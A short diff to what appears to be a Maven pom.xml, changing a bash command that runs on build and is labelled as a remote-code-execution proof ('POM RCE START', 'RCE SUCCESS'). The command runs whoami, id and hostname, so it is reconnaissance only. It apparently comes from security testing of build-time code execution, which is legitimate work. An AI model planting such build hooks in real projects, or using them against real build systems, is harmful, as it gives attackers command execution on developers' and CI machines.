@@ -146,7 +146,7 @@
                 <executable>bash</executable>
                 <arguments>
                     <argument>-c</argument>
-                    <argument>echo '=== POM RCE START ===' &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; echo '=== POM RCE END ==='</argument>
+                    <argument>echo "=== RCE SUCCESS ===" &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname</argument>
                 </arguments>
             </configuration>
         </execution>
